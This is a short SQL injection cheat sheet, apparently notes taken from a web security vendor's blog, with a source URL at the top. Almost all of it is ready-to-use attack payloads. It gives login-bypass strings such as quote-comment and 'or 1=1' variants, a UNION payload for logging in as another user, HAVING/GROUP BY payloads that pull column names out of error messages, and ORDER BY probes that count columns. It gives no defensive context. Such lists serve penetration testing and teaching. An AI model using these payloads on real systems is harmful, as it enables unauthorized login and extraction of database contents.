https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet#ByPassingLoginScreens
## bypass login
SQL injection 101: here are some typical login tricks that you can use with form fields and parameters:

- `admin' --`
- `admin' #`
- `admin'/*`
- `' or 1=1--`
- `' or 1=1#`
- `' or 1=1/*`
- `') or '1'='1--`
- `') or ('1'='1--`

Another trick is to log in as a different user (SM*):  
`' UNION SELECT 1, 'anotheruser', 'any string', 1--`

## discover column info
Try the following payloads in the specified order:

- `' HAVING 1=1 --` (triggers error 1)
- `' GROUP BY **table.columnfromerror1** HAVING 1=1 --` (triggers error 2)
- `' GROUP BY **table.columnfromerror1, columnfromerror2** HAVING 1=1 --` (triggers error 3)
- ...
- `' GROUP BY **table.columnfromerror1, columnfromerror2, columnfromerror(n)** HAVING 1=1 --`

## find number of columns
Finding the number of columns using `ORDER BY` can speed up the `UNION` SQL injection process. Try the following payloads:

- `ORDER BY 1--`
- `ORDER BY 2--`
- ...
- `ORDER BY N--`

Keep going until you get an error, which means you have found the number of columns being selected.
